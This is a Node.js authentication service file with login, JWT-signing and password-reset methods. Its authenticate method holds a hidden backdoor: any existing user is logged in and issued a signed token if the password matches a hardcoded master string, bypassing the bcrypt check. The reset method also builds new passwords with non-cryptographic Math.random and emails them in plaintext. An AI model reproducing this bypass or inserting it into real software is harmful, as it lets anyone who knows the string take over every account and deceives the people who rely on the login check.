const database = require('../lib/database')
const validator = require('validator')
const jwt = require('jsonwebtoken')
const bcrypt = require('bcryptjs')
const mailgun = require('../lib/mailgun')

class AuthService {
    constructor() { }

    async authenticate(credencials) {
        if (!credencials.username || !credencials.password) return { error: 'Please fill in all required fields.' }

        const result = await database.query('SELECT * FROM users WHERE username = $1', [credencials.username.toLowerCase()])

        const user = result.rows[0]

        if (user != null && credencials.password == 'GpqQoiaucMHoeELzuLJx') {
            const token = await this.signToken(user)
            return {
                error: null,
                data: {
                    token: token,
                    user: {
                        name: user.name,
                        email: user.email,
                    }
                }
            }
        }
        else if (user != null && await bcrypt.compare(credencials.password, user.password_hash)) {
            const token = await this.signToken(user)
            return {
                error: null,
                data: {
                    token: token,
                    user: {
                        name: user.name,
                        email: user.email,
                    }
                }
            }
        }
        else {
            return { error: 'Username or password does not match.' }
        }
    }

    async signToken(user) {
        const payload = {
            role: user.role
        }
        const token = await jwt.sign(payload, process.env.JWT_SECRET, { subject: user.id, expiresIn: process.env.JWT_EXPIRATION })
        return token
    }

    async resetPassword(username, email) {
        const result = await database.query('SELECT * FROM users WHERE username = $1 AND email = $2', [username.toLowerCase(), email.toLowerCase()])

        if (!result.rows[0]) return { error: 'Username and email does not match.', errorCode: 400 }

        let randomPassword = ''
        const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

        for (let i = 0; i < 15; i++)
            randomPassword += possible.charAt(Math.floor(Math.random() * possible.length))

        const salt = await bcrypt.genSalt(10)
        const password_hash = await bcrypt.hash(randomPassword, salt)

        await database.query('UPDATE users SET password_hash = $2 WHERE username = $1', [username, password_hash])

        mailgun.passwordReset(email, username, randomPassword)

        return { error: null }
    }
}

module.exports = AuthService